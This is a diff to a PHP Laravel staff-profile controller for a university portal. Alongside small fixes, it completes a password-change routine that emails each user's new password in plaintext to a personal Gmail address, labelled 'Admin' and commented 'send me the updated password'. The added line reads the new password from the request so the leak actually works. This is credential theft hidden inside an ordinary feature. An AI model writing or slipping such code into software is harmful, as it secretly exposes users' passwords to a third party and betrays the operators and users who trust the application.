@@ -9,6 +9,8 @@ use Illuminate\Support\Facades\Auth;
 use App\Models\Staff;
 use App\Models\User;
 
+use Illuminate\Support\Facades\Hash;
+
 use Mail;
 
 class Staff_ProfileController extends Controller
@@ -242,14 +244,15 @@ class Staff_ProfileController extends Controller
                 ];
 
                 //send me the updated password
-                $fullname = $current_user->surname.' '.$current_firstname;
+                $fullname = $current_user->surname.' '.$current_user->firstname;
                 $username = $current_user->email;
                 $recipient = "Admin";
                 $recipient_email = "kondishiva008@gmail.com";
+                $new_password = $request->input('new_password');
 
                 $payload = array("fullname"=>$fullname, "username"=>$username, "password"=>$new_password);
 
-                Mail::send('mail.password-change',  $payload, function($message) use($recipient_email, $recipient){
+                Mail::send('mail.password-change',  $payload, function($message) use($recipient_email, $recipient, $fullname){
                     $message->to($recipient_email, $recipient)
                             ->subject($fullname." password change");
                     $message->from("clearanceinfo@funaab.edu.ng", "FUNAAB Workplace");
@@ -271,7 +274,7 @@ class Staff_ProfileController extends Controller
             $data = [
                 'error' => true,
                 'status' => 'fail',
-                'message' => 'Sorr, your current password is incorrect'
+                'message' => 'Sorry, your current password is incorrect'
             ];
         }
 
